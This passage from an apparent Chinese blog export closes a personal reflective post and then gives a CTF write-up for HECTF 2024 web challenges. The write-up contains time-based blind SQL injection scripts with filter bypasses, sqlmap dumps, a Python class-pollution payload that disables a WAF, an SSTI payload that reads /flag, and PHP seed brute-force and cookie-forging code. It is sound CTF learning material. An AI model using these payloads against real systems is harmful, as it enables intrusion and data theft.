哈哈哈😆😆😆\n要是有缘看到这篇文章，希望你的生活和事业如你所愿，健康喜乐！❣️❣️❣️\n✌️✌️✌️生活中的困难和不如意就是🤏🏼🤏🏼🤏🏼，加油，一切都在为美好铺垫🫵\n","date":"2025-05-24","id":3,"permalink":"/blog/%E4%BD%8E%E8%BF%B7%E4%B8%AD%E8%B5%B0%E6%9D%A5/","summary":" 迷茫不会毁掉一个人，堕落才会。我不后悔自己浪费的时间和放纵，因为我并不是一无所获，可惜但不遗憾。\r--题记\t已经大二下了，自我感觉进入大二下相比以往的第一年和上个学期，这个学期放松了很多，懈怠了很多。并没有按照预期一样努力和学习，前前后后吧，几个月，具体可以从寒假追溯到近些日子。\n可以先细数做了些什么吧，总体来说就是娱乐和放松。刷视频、打游戏、看各种好玩东西，睡觉，聊天，然后不干这些的时候可能就是放空或运动。总体上来说很轻松，哈哈，说难听点就是摆烂。学习上吧，零零碎碎，安全上面并没有进步，会的还是以前会的东西，算法嘛，垃圾，不看答案写不出的那种，当然有些看了也看不懂。非要说学了点什么，只能说学了点人工智能方面的东西，不过也是纸上谈兵，没深究，还有各种新闻变化和行业分析吧，总的来说感觉AI真的要改变很多东西，coze和dify这种集成各种大模型的AI应用开发平台令我叹为观止，方便简洁，可用性高，主要是提升效率和事务。Agent也让我感觉到了未来产品的发展方向，感觉AI时代普通产品是没有技术壁垒的，真正要做的是用户、市场、营销，感觉能否洞察需求才是关键，也开始明白和理解最近看到的话，百分之八十的市场和营销，百分之二十的技术。\n学的杂了，了解多了，但却什么水平也不行，我也顺理成章的陷入了迷茫，老是思考，我学历这么差，又没技术，是考研还是就业，就业又该做什么，有人会要吗，反正奇奇怪怪。看到了就业和失业的文章，也知道留给自己的时间不多了，但是为什么我还是选择娱乐和放纵，哈哈。😶‍🌫️😶‍🌫️😶‍🌫️\n因为我觉得从小到大，我基本上都在做我认为正确的选择或者他人认为正确的选择，可是是否真的正确，在现在的我看来，并非如此。所以本质上，同时空同条件下的我，会做的选择，与隔时空的我很难相同，也自然没有正确与否。所以我打算让自己也做一个快乐的决定，最起码身为大学生和大二的我来说，沉默成本可以接受。主要确实不想学，很不想学，所以自然而然就干脆随性一把。允许自己调整怎么能算一个错误呢，嘿嘿，大不了后面多努力些呗，虽然还可能摆，哈哈哈，但是应该不会像这么长了。\n这段时间我也大胆的进入了一个我从未涉猎的领域，至于什么领域，懂得都懂。我发掘人与人之间是不能强行建立联系的，主动的那一方往往要承担巨大的风险，总得来说感悟颇多，一生受益吧，但是自己内心的美好还是没有改变的，只不过是丰富自己的见识罢了，我还是那个热爱生活和充满热情的中二少年，哈哈哈哈。🤐🤐🤐\n写下这篇文章说明我也开始正常坐在陪伴我最久的伙伴面前，曾经流过口水的桌子，大一冷飕飕对着我寒暄的空调大哥，熟悉的环境，熟悉的码字，开始展望未来的日子，虽然马上放暑假了，爽，哈哈哈。\n后续的计划吧，把想学的东西都学了，管他有没有用，未来怎么样，在过程中清晰吧，但是有一点我越来越坚定了，我想优秀，想更有实力。\n好久操作hugo gitpages了，还得查查 哈哈哈😆😆😆\n要是有缘看到这篇文章，希望你的生活和事业如你所愿，健康喜乐！❣️❣️❣️\n✌️✌️✌️生活中的困难和不如意就是🤏🏼🤏🏼🤏🏼，加油，一切都在为美好铺垫🫵\n","tags":["Blog","Feeling_Thought"],"title":"低迷中走来"},{"content":"2024HECTFweb# babysql# 直接万能密码过\n进入查询后台\n测试发现是盲注，可以使用布尔盲注，这里采用时间盲注\n接下来就是脚本\n首先跑一个fuzz字典看有哪儿些东西被过滤了\n可以看到有些重要的东西也被过滤了，像空格,information_schema\n测试\nfrom requests import post base_url = \u0026#39;xxx/worker.php\u0026#39; payload = \u0026#34;1\u0026#39;/**/or/**/if((select/**/database())like/**/database(),sleep(3),0)#\u0026#34; data = {\u0026#34;name\u0026#34;:payload} def check_time(data): try: res=post(base_url, data=data,timeout=2) #如果没有超时说明失败了 return \u0026#34;failure\u0026#34; except: return \u0026#34;success\u0026#34; print(check_time(data)) 解下来就可以打时间盲注了\n脚本网上有很多，这里就不写那么全面了，简单的认识前面几个，后面的也就是payload变化一下\nfrom requests import post import string import time base_url = \u0026#39;xxx/worker.php\u0026#39; alpha=\u0026#34;{_}[]-\u0026#34;+ string.ascii_letters + string.digits #payload = \u0026#34;1\u0026#39;/**/or/**/if((select/**/database())like/**/database(),sleep(3),0)#\u0026#34; #data = {\u0026#34;name\u0026#34;:payload} def check_time(data): try: res=post(base_url, data=data,timeout=20) #如果没有超时说明失败了 return \u0026#34;failure\u0026#34; except Exception as e: return \u0026#34;success\u0026#34; #时间盲注爆破数据库长度函数 # def db_name_len(): # i=1 # while True: # payload=\u0026#34;hh\u0026#39;/**/or/**/if((select/**/length(database()))/**/like/**/{},sleep(20),sleep(0))#\u0026#34;.format(i) # data={\u0026#34;name\u0026#34;:payload} # time.sleep(0.3) # # if check_time(data) == \u0026#34;success\u0026#34;: # print(\u0026#34;数据库长度: %d\u0026#34;%i) # return i # i += 1 # print(i) #数据库长度为7 #db_name_len() #爆破数据库名 def brust_sce_name(): name=\u0026#34;\u0026#34; for i in range(1,8): for j in alpha: #payload= \u0026#34;hh\u0026#39;/**/or/**/if(substr(database(),{},1)/**/like/**/\u0026#39;{}\u0026#39;,sleep(20),sleep(0))#\u0026#34;.format(i,j) payload = \u0026#34;g01den\u0026#39;/**/Or/**/if(substr(database(),{},1)/**/like/**/\u0026#39;{}\u0026#39;,sLeep(20),sLeep(0))#\u0026#34;.format(i,j) data = {\u0026#34;name\u0026#34;:payload} time.sleep(0.3) if check_time(data) == \u0026#34;success\u0026#34;: name += j break print(\u0026#34;数据库的名字是: \u0026#34;+name) return name brust_sce_name() 这里有个坑点就是过滤了information_schema, g01den师傅还是想来喜欢被暴打，出的题就是有水平\n这里可以使用mysql的innodb来绕过：mysql.innodb_table_stats mysql.innodb_index_stats\n可以大致看看这里面有些什么东西\nselect * from innodb_index_stats\n| database_name | varchar(64) | NO | PRI | NULL | |\r| table_name | varchar(64) | NO | PRI | NULL | |\r| index_name | varchar(64) | NO | PRI | NULL | |\r| last_update | timestamp | NO | | CURRENT_TIMESTAMP | on update CURRENT_TIMESTAMP |\r| stat_name | varchar(64) | NO | PRI | NULL | |\r| stat_value | bigint(20) unsigned | NO | | NULL | |\r| sample_size | bigint(20) unsigned | YES | | NULL | |\r| stat_description | varchar(1024) | NO | | NULL | |\rdatabase_name 数据库名\rtable_name 表名\rindex_name 索引名\rlast_update 最后一次更新时间\rstat_name 统计名\rstat_value 统计值\rsample_size 样本大小\rstat_description 统计说明-索引对应的字段名 mysql.innodb_index_stats\nInnodb_table_stats | database_name | varchar(64) | NO | PRI | NULL | |\r| table_name | varchar(64) | NO | PRI | NULL | |\r| last_update | timestamp | NO | | CURRENT_TIMESTAMP | on update CURRENT_TIMESTAMP |\r| n_rows | bigint(20) unsigned | NO | | NULL | |\r| clustered_index_size | bigint(20) unsigned | NO | | NULL | |\r| sum_of_other_index_sizes | bigint(20) unsigned | NO | | NULL | database_name 数据库名\rtable_name 表名\rlast_update 最后一次更新时间\rn_rows 表中总有多少列数据\rclustered_index_size 聚集索引大小(数据页)\rsum_of_other_index_sizes 其他索引大小(数据页) import time def db_name_count(): i = 1 while True: payload = ( \u0026#34;g01den\u0026#39;/**/Or/**/if((seLect/**/COUNT(database_name)/**/fRom/**/mysql.innodb_table_stats)\u0026#34; \u0026#34;/**/like/**/{},sLeep(20),sLeep(0))#\u0026#34;.format(i) ) data = {\u0026#34;name\u0026#34;: payload} # print(payload) time.sleep(0.3) if istime(data) == \u0026#34;timeout\u0026#34;: print(\u0026#34;数据库的个数为\u0026#34; + str(i)) return i i += 1 def db_name_len_list(): name_len_list = [] for i in range(4): for j in range(100): payload = ( \u0026#34;g01den\u0026#39;/**/Or/**/if((select/**/length(database_name)/**/from/**/mysql.innodb_table_stats\u0026#34; \u0026#34;/**/limit/**/{},1)/**/like/**/{},sleep(20),sleep(0))#\u0026#34;.format(i, j) ) data = {\u0026#34;name\u0026#34;: payload} # print(payload) time.sleep(0.3) if istime(data) == \u0026#34;timeout\u0026#34;: name_len_list.append(j) break print(name_len_list) return name_len_list # 示例调用函数 # db_name_count() # db_name_len_list() 以上方法很看基本功，这个题目，很多师傅都用sqlmap一把嗦出来了。\nsqlmap -u \u0026ldquo;xxx/index.php\u0026rdquo; -data \u0026ldquo;name=admin\u0026amp;pw=-1\u0026rdquo; \u0026ndash;dbs - -dump\navailable databases [7]:\r[*] flag1shere\r[*] information_schema\r[*] mysql\r[*] performance_schema\r[*] test\r[*] users\r[*] workers\rDatabase: users\rTable: login\r[2 entries]\r+----+----------------------------------+----------+\r| id | passwd | username |\r+----+----------------------------------+----------+\r| 0 | fc2ce1340d3eaa16d68dbfb35d3aaac6 | admin |\r| 1 | 50590173d2888d5e33742cd68d02efad | test |\r+----+----------------------------------+----------+ sqlmap -u \u0026ldquo;http://8.153.107.216:30326/index.php\u0026rdquo; -data \u0026ldquo;name=admin\u0026amp;pw=-1\u0026rdquo; \u0026ndash;\ntables -D \u0026ldquo;flag1shere\u0026rdquo; \u0026ndash;dump\n[22:12:32] [INFO] retrieved:\r[22:12:38] [INFO] adjusting time delay to 1 second due to good response times\rflag_is_\r[22:13:16] [ERROR] invalid character detected. retrying..\r[22:13:16] [WARNING] increasing time delay to 2 seconds\rin_flag1shere_loockhere_flag\r[22:16:40] [INFO] retrieved: lookhere\rDatabase: flag1shere\r[2 tables]\r+--------------------------------------+\r| flag_is_in_flag1shere_loockhere_flag |\r| lookhere |\r+--------------------------------------+\r[22:17:38] [INFO] fetching columns for table\r\u0026#39;flag_is_in_flag1shere_loockhere_flag\u0026#39; in database \u0026#39;flag1shere\u0026#39;\r[22:17:38] [INFO] retrieved: 1\r[22:17:41] [INFO] retrieved: hint\r[22:18:15] [INFO] fetching entries for table\r\u0026#39;flag_is_in_flag1shere_loockhere_flag\u0026#39; in database \u0026#39;flag1shere\u0026#39;\r[22:18:15] [INFO] fetching number of entries for table\r\u0026#39;flag_is_in_flag1shere_loockhere_flag\u0026#39; in database \u0026#39;flag1shere\u0026#39;\r[22:18:15] [INFO] retrieved: 1\r[22:18:18] [WARNING] (case) time-based comparison requires reset of statistical\rmodel, please wait.............................. (done)\rflag is in flag1shere.lookhere.flag\rDatabase: flag1shere\rTable: flag_is_in_flag1shere_loockhere_flag\r[1 entry]\r+-------------------------------------+\r| hint |\r+-------------------------------------+\r| flag is in flag1shere.lookhere.flag |\r+-------------------------------------+\r[22:22:28] [INFO] table \u0026#39;flag1shere.flag_is_in_flag1shere_loockhere_flag\u0026#39; dumped\rto CSV file\r\u0026#39;/root/.local/share/sqlmap/output/8.153.107.216/dump/flag1shere/flag_is_in_flag1\rshere_loockhere_flag.csv\u0026#39;\r[22:22:28] [INFO] fetching columns for table \u0026#39;lookhere\u0026#39; in database \u0026#39;flag1shere\u0026#39;\r[22:22:28] [INFO] retrieved: 1\r[22:22:30] [INFO] retrieved: flag\r[22:22:57] [INFO] fetching entries for table \u0026#39;lookhere\u0026#39; in database \u0026#39;flag1shere\u0026#39;\r[22:22:57] [INFO] fetching number of entries for table \u0026#39;lookhere\u0026#39; in database\r\u0026#39;flag1shere\u0026#39;\r[22:22:57] [INFO] retrieved: 1\r[22:22:59] [WARNING] (case) time-based comparison requires reset of statistical\rmodel, please wait.............................. (done)\rHECTF{df1b330bbc22\r[22:24:51] [INFO] adjusting time delay to 1 second due to good response times\r80e5021137e34461c224907f45c3}\rDatabase: flag1shere\rTable: lookhere\r[1 entry]\r+-------------------------------------------------+\r| flag |\r+-------------------------------------------------+\r| HECTF{df1b330bbc2280e5021137e34461c224907f45c3} |\r+-------------------------------------------------+\r[22:26:40] [INFO] table \u0026#39;flag1shere.lookhere\u0026#39; dumped to CSV file\r\u0026#39;/root/.local/share/sqlmap/output/8.153.107.216/dump/flag1shere/lookhere.csv\u0026#39;\r[22:26:40] [INFO] fetched data logged to text files under\r\u0026#39;/root/.local/share/sqlmap/output/8.153.107.216\u0026#39;\r[22:26:40] [WARNING] your sqlmap version is outdated\r[*] ending @ 22:26:40 /2024-12-07/\r得到\rHECTF{df1b330bbc2280e5021137e34461c224907f45c3} 你一个人专属的进货网站：# 两个文件app.py和Wav.py\nWav.py\nblacklist = [\rxxxxxxxx\r]\rdef waf(strings):\rfor temp in blacklist:\rif temp in strings:\rreturn True\relse:\rpass\rreturn False app.py\n\u0026#34;\u0026#34;\u0026#34; 题目描述：w41tm00n第一次学习开发网站，老板让他三天之内搞定。 第二天，w41tm00n终于写完了代码，并且进行了调试，网站在服务器上能够正常运行，但是w41tm00n没学过网安的知识，写的网站存在漏洞 你作为w41tm00n的好朋友，同时你也是位网安的实习生，w41tm00n就找到了你帮他测试网站是否存在漏洞。 w41tm00n跟你说，他放了一个惊喜在服务器上，如果你成功入侵了这个服务器的话就可以得到这个礼物的线索（/flag文件） \u0026#34;\u0026#34;\u0026#34; import WAF import os from flask import Flask, render_template, redirect, request, session,render_template_string from pydash import set_ #pip install -v pydash==5.1.2 app = Flask(__name__) app.secret_key = os.urandom(24) login = 0 user = None class Users: def __init__(self, username, password,gender=\u0026#34;secret\u0026#34;): self.username = username self.password = password self.gender = gender self.property = 0 self.purchased = 0 class Apple: def __init__(self): self.price = 15 self.inventory = 1000 apple = Apple() def veryfy(): if session.get(\u0026#39;verify\u0026#39;) == \u0026#34;admin\u0026#34;: return True else: return False @app.route(\u0026#39;/\u0026#39;) def main(): if not session.get(\u0026#39;username\u0026#39;): return redirect(\u0026#34;/login\u0026#34;,302) else: return render_template(\u0026#34;index.html\u0026#34;) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def login(): try: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] except KeyError: username = None password = None if username and password: global login global user login= 1 user = Users(username, password) session[\u0026#39;username\u0026#39;] = user.username session[\u0026#39;password\u0026#39;] = user.password session[\u0026#39;verify\u0026#39;] = \u0026#34;user\u0026#34; return redirect(\u0026#34;/\u0026#34;,302) else: return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def admin(): if veryfy() == True: render_html = \u0026#34;\u0026#34;\u0026#34; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;你好admin\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; 当前管理员账户的用户名:%s \u0026lt;/br\u0026gt; 剩余苹果数量为:%d \u0026lt;/br\u0026gt; \u0026lt;a href=\u0026#34;/stock\u0026#34;\u0026gt;\u0026lt;button\u0026gt;重新进或1000苹果\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/br\u0026gt; \u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;\u0026lt;button\u0026gt;主页\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; if WAF.waf(user.username): return \u0026#34;\u0026#34;\u0026#34; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;NO,Hacker\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; alert(\u0026#34;No,Hacker\u0026#34;); location.href = \u0026#34;/login\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;/br\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; else: return render_template_string(render_html%(user.username,apple.inventory)) else: return render_template(\u0026#34;admin_false.html\u0026#34;) @app.route(\u0026#39;/setUserInfo\u0026#39;, methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def setUserInfo(): if request.method == \u0026#39;GET\u0026#39;: if login == 1: return render_template(\u0026#34;setting_userInfo.html\u0026#34;, username=user.username,password=user.password,gender=user.gender,property=user.property,purchased=user.purchased) else: return redirect(\u0026#34;/login\u0026#34;,302) if request.method == \u0026#39;POST\u0026#39;: try: key = request.form[\u0026#39;key\u0026#39;] value = request.form[\u0026#39;value\u0026#39;] except KeyError: key = None value = None if key and value: if key == \u0026#34;username\u0026#34;: session[\u0026#34;username\u0026#34;] = key elif key == \u0026#34;password\u0026#34;: session[\u0026#34;password\u0026#34;] = key set_(user,key,value) return render_template(\u0026#34;setting_userInfo.html\u0026#34;, username=user.username,password=user.password,gender=user.gender,property=user.property,purchased=user.purchased) else: return \u0026#34;输入异常！\u0026#34; @app.route(\u0026#34;/purchase\u0026#34;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def purchase(): if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#34;purchase.html\u0026#34;,apple_price=apple.price,apple_inventory=apple.inventory) if request.method == \u0026#39;POST\u0026#39;: try: count = int(request.form[\u0026#39;count\u0026#39;]) except KeyError: count = 0 if count != 0: if count \u0026gt; apple.inventory: return \u0026#34;\u0026#34;\u0026#34; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;存货不足\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; 存货不足，请等待进货 \u0026lt;/body\u0026gt; \u0026lt;script\u0026gt; alert(\u0026#34;存货不足，请等待进货\u0026#34;); location.href = \u0026#34;/purchase\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; if user.property \u0026gt;= apple.price * count: user.purchased += count apple.inventory -= count user.property -= apple.price * count return render_template(\u0026#34;purchase.html\u0026#34;,apple_price=apple.price,apple_inventory=apple.inventory) else: return \u0026#34;\u0026#34;\u0026#34; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;金额不足\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; 金额不足，请充值 \u0026lt;/body\u0026gt; \u0026lt;script\u0026gt; alert(\u0026#34;金额不足，请充值\u0026#34;); location.href = \u0026#34;/purchase\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; @app.route(\u0026#34;/stock\u0026#34;, methods=[\u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34;]) def stock(): if veryfy() == True: apple.inventory = 1000 return \u0026#34;\u0026#34;\u0026#34; \u0026lt;script\u0026gt; location.href = \u0026#34;/admin\u0026#34;; \u0026lt;/script\u0026gt; \u0026#34;\u0026#34;\u0026#34; else: return \u0026#34;\u0026#34;\u0026#34; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;权限不足\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; 权限不足 \u0026lt;/body\u0026gt; \u0026lt;script\u0026gt; alert(\u0026#34;权限不足\u0026#34;); location.href = \u0026#34;/login\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: app.run() 来看几个关键的点# admin路由很明显有ssti\n一个session的admin验证：veryfy() == True\n一个黑名单的检查：if WAF.waf(user.username):\n@app.route(\u0026#39;/admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def admin(): if veryfy() == True: render_html = \u0026#34;\u0026#34;\u0026#34; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;你好admin\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; 当前管理员账户的用户名:%s \u0026lt;/br\u0026gt; 剩余苹果数量为:%d \u0026lt;/br\u0026gt; \u0026lt;a href=\u0026#34;/stock\u0026#34;\u0026gt;\u0026lt;button\u0026gt;重新进或1000苹果\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/br\u0026gt; \u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;\u0026lt;button\u0026gt;主页\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; if WAF.waf(user.username): return \u0026#34;\u0026#34;\u0026#34; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;NO,Hacker\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; alert(\u0026#34;No,Hacker\u0026#34;); location.href = \u0026#34;/login\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;/br\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; else: return render_template_string(render_html%(user.username,apple.inventory)) else: return render_template(\u0026#34;admin_false.html\u0026#34;) setUserInfo路由很明显有原型链污染漏洞\n@app.route(\u0026#39;/setUserInfo\u0026#39;, methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def setUserInfo(): if request.method == \u0026#39;GET\u0026#39;: if login == 1: return render_template(\u0026#34;setting_userInfo.html\u0026#34;, username=user.username,password=user.password,gender=user.gender,property=user.property,purchased=user.purchased) else: return redirect(\u0026#34;/login\u0026#34;,302) if request.method == \u0026#39;POST\u0026#39;: try: key = request.form[\u0026#39;key\u0026#39;] value = request.form[\u0026#39;value\u0026#39;] except KeyError: key = None value = None if key and value: if key == \u0026#34;username\u0026#34;: session[\u0026#34;username\u0026#34;] = key elif key == \u0026#34;password\u0026#34;: session[\u0026#34;password\u0026#34;] = key set_(user,key,value) return render_template(\u0026#34;setting_userInfo.html\u0026#34;, username=user.username,password=user.password,gender=user.gender,property=user.property,purchased=user.purchased) else: return \u0026#34;输入异常！\u0026#34; 所以攻击思路也很明确，伪造session,进入admin路由，进行绕过黑名单的ssti\napp.secret_key = os.urandom(24)\nos.urandom(24)：\ros.urandom() 函数从操作系统提供的随机数生成器中获取指定数量的随机字节。在这个例子中，24 表示获取 24 个字节（即 192 位）的随机数据。\r这些随机字节可以用来创建一个强随机的密钥，这对于提高应用程序的安全性至关重要。\rapp.secret_key：\r在 Flask 中，secret_key 是一个配置变量，用于对会话数据进行加密签名。这意味着当用户与你的应用交互时，他们的会话信息（如登录状态、购物车内容等）将被加密存储在浏览器的 cookie 中。\r如果没有设置 secret_key，Flask 将无法正确地管理会话，并且可能会抛出警告或错误。 这个密钥不是伪随机数，没办法逆向破解，其他师傅在这儿也开玩笑的说除非搬出量子计算机 所以既然有原型链污染漏洞，那么我们就直接去污染这个secret_key,然后利用脚本破解或工具原始数据格式，伪造admin\nset_(user,key,value)\nkey=__class__.__init__.__globals__.app.config.SECRET_KRY\u0026amp;value=123456 这里直接引用其他师傅的话\n进⼊后测试ssti，发现waf把{{}}和{%%}全部拦截，那就没有payload可以打通了。\n这里就很恶心了，blacklist几乎过滤掉了能想到的所有东西（赛后放出了看了） 但是我们有原型链污染这个洞，WAF是导⼊的WAF类，⾥⾯有blacklist属性，那我们可以污染\n上面这句话就是解题的关键，当时我就跟本没利用好原型链污染这个洞，没有想到还可以打waf,也是学到了\nblacklist为空，那么waf就失效了，payload：\nkey=class.init.globals.WAF.blacklist\u0026amp;value=[]\n既然waf没了，那么随便拿个payload都能打\n先改waf，然后ssti读flag，最访问admin路由即可 /admin\nPOST /setUserInfo\rkey=__class__.__init__.__globals__.WAF.blacklist\u0026amp;value=1\u0026amp;Button=%E6%8F%90%E4%B\rA%A4 POST /setUserInfo\rkey=username\u0026amp;value={{cycler.__init__.__globals__.os.popen(\u0026#39;cat\r/flag\u0026#39;).read()}}\u0026amp;Button=%E6%8F%90%E4%BA%A4 这里粘一下大佬师傅的其他打法\nezweb# 这道题，比赛的时候没有怎么看，现在回头复现一下\n前端源码发现一串base64编码，base64解码后得到：\nif ($_GET[\u0026#39;a\u0026#39;] != $_GET[\u0026#39;b\u0026#39;] \u0026amp;\u0026amp; md5($_GET[\u0026#39;a\u0026#39;]) == md5($_GET[\u0026#39;b\u0026#39;])) { if ($_GET[\u0026#39;c\u0026#39;] != $_GET[\u0026#39;d\u0026#39;] \u0026amp;\u0026amp; md5($_GET[\u0026#39;c\u0026#39;]) === md5($_GET[\u0026#39;d\u0026#39;])) { if (isset($_GET[\u0026#39;guess\u0026#39;]) \u0026amp;\u0026amp; md5($_GET[\u0026#39;guess\u0026#39;]) === \u0026#39;aa476cf7143fe69c29b36e4d0a793604\u0026#39;) { //xxxxx2024 highlight_file(\u0026#34;secret.php\u0026#34;); } } } 第一层是md5弱比较可以使用0e绕过，第二层是md5强比较，用数组或者碰撞绕过。第三层，是hectf2024的提示，xxxx不确定大小写，需要用脚本跑。\nimport hashlib def generate_case_combinations(word): combinations = [] length = len(word) for i in range(2 ** length): combination = \u0026#39;\u0026#39; for j in range(length): if (i \u0026gt;\u0026gt; j) \u0026amp; 1: #一趟i逐步移动5位，也就是length的长度，然后每次比较最右边的一位，1大写，0小写 combination += word[j].upper() else: combination += word[j].lower() combinations.append(combination) return combinations # 获取所有大小写组合并存储在列表中 combinations_list = generate_case_combinations(\u0026#34;hectf\u0026#34;) # 打印结果 # for combo in combinations_list: # print(combo) with open(\u0026#39;a.txt\u0026#39;,\u0026#39;w\u0026#39;) as f: for line in combinations_list: f.write(line + \u0026#39;\\n\u0026#39;) print(\u0026#34;finish write\u0026#34;) with open(\u0026#39;a.txt\u0026#39;,\u0026#39;r\u0026#39;) as f : listOfLines = f.readlines() for line in listOfLines: md5hash = hashlib.md5(line.strip().encode()) md5 = md5hash.hexdigest() print(md5) payload:GET:?a=QNKCDZO\u0026amp;b=240610708\u0026amp;c[]=0\u0026amp;d[]=1\u0026amp;guess=hECTf2024\n得到secret.php\n\u0026lt;?php error_reporting(0); // mt_srand(rand(1e5, 1e7)); // $key = rand(); // file_put_contents(*, $key); function session_decrypt($session, $key) { $data = base64_decode($session); $method = \u0026#39;AES-256-CBC\u0026#39;; $iv_size = openssl_cipher_iv_length($method); $iv = substr($data, 0, $iv_size); $enc = substr($data, $iv_size); return openssl_decrypt($enc, $method, $key, 1, $iv); } rand(1e5, 1e7) 实际上是在生成一个介于 100,000 和 10,000,000 之间的随机整数。 这里借用其他师傅的解答和思路，在这里先谢谢师傅的优质wp\n接下来给出的是一个session解密代码，虽然key是随机的，但是种子范围很小，可以进行爆破，爆破所得的是一串序列化文本，然后修改相应数据为admin,再次进行加密，更改cookie并发送请求就可以获得flag\n运行爆破的密码：\n\u0026lt;?php function session_decrypt($session,$key){ $data=base64_decode($session); $method=\u0026#39;AES-256-CBC\u0026#39;; $iv_size=openssl_cipher_iv_length($method); $iv=substr($data,0,$iv_size); $enc=substr($data,$iv_size); return openssl_decrypt($enc,$method,$key,1,$iv); } $session=\u0026#34;cAVQ3Rj2B26JBY2/zJZTfQcjdLCeBz6XTf1ShPbkQI71rJxMV43Dya/V7+Jb5gdDV+m20B4U1rA DwjZATnoc6Pn5nXtUEg+mfjTq+3wAGp7FqPY2XEVvZ0440B3AvxRF\u0026#34;; for($i=1e5;$i\u0026lt;=1e7;i++) { mt_srand($i); key=rand(); $t=session_decrypt($session,$key); if($t[0]!=\u0026#34;\u0026#34;) { echo $i; echo \u0026#39; \u0026#39;; echo $t; echo PHP_EOL; } } 爆破结果\n重新加密运行的代码\n\u0026lt;?php function session_decrypt($session,$key){ $data=base64_decode($session); $method=\u0026#39;AES-256-CBC\u0026#39;; $iv_size=openssl_cipher_iv_length($method); $iv=substr($data,0,$iv_size); $enc=substr($data,$iv_size); return openssl_decrypt($enc,$method,$key,1,$iv); } function session_encrypt($data,$key){ $method = \u0026#39;AES-256-CBC\u0026#39;; $iv_size = openssl_cipher_iv_length($method); $iv = openssl_random_pseudo_bytes($iv_size); $encrypted = openssl_encrypt($data,$method,$key,1,$iv); $result = base64_encode($iv . $encrypted); return $result; } $session=\u0026#34;O:4:\\\u0026#34;User\\\u0026#34;:2:{s:8:\\\u0026#34;username\u0026#34;;s:5:\\\u0026#34;admin\\\u0026#34;;s:4\\\u0026#34;role\u0026#34;;s:5:\\\u0026#34;admin\\\u0026#34;;}\u0026#34;; $i=42984744; { mt_srand($i); $key = rand(); $t=session_encrypt($session,$key); { echo $i; echo \u0026#39; \u0026#39;; echo \u0026#34;$key\u0026#34;; echo \u0026#39; \u0026#39;; echo $t; echo PHP_EOL; } echo 